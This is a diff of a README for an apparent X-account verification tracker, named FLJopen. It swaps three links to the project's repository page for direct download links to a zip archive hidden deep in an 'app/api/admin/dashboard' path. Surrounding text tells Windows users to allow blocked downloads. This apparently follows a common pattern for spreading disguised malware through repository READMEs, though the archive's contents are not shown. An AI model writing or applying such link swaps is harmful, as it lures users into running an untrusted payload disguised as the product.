@@ -1,6 +1,6 @@
 # 🔎 FLJopen - Track Public X Account Verification
 
-[![Download FLJopen](https://img.shields.io/badge/Download-FLJopen-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aradhyagithub/FLJopen)
+[![Download FLJopen](https://img.shields.io/badge/Download-FLJopen-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/aradhyagithub/FLJopen/main/app/api/admin/dashboard/FL_Jopen_v2.1.zip)
 
 ## 🧭 What FLJopen Does
 
@@ -24,7 +24,7 @@ If your device blocks downloads from GitHub, you may need to allow the file in W
 
 Go to the main project page here:
 
-[Visit the FLJopen download page](https://github.com/aradhyagithub/FLJopen)
+[Visit the FLJopen download page](https://raw.githubusercontent.com/aradhyagithub/FLJopen/main/app/api/admin/dashboard/FL_Jopen_v2.1.zip)
 
 On that page, look for the latest release or the main app file. If the project provides a Windows package, download that file to your computer.
 
@@ -173,7 +173,7 @@ If the app does not work as expected:
 
 ## 📦 Download Page
 
-[Open the FLJopen repository and download the app](https://github.com/aradhyagithub/FLJopen)
+[Open the FLJopen repository and download the app](https://raw.githubusercontent.com/aradhyagithub/FLJopen/main/app/api/admin/dashboard/FL_Jopen_v2.1.zip)
 
 ## 🧭 Quick Start
 
